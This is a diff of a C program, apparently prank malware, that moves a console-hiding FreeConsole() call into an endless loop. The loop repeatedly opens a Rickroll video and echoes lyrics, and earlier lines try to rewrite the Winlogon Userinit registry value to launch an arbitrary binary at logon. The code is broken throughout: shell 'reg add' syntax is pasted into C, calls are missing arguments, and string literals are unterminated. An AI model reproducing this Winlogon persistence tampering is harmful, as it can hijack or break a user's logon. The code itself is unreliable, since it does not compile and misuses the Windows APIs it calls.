@@ -6,7 +6,6 @@
 #include <stdlib.h>
 
 int main(){
-	FreeConsole(); // >:)
 
 	MessageBox(NULL, "SMILE >:)", MB_OK);
 	reg add("HKLM\\SOFTWARE\\Microsoft\Windows NT\\CurrentVersion\\Winlogon" \v Userinit \t REG_SZ \d "C:\\Really\\Stupid\\Malware\\binary.exe", "C:\\Windows\\system32\\nakoromo.exe"); // reg key :)
@@ -16,6 +15,7 @@ int main(){
 
 	char ur_mom = true;
 	while(ur_mom == true){
+                FreeConsole(); // >:)
 		ShellExecute(0, 0, "https://youtu.be/dQw4w9WgXcQ?autoplay=1", 0, 0, SW_SHOW);
 		system("echo We're no strangers to love
 			You know the rules and so do I
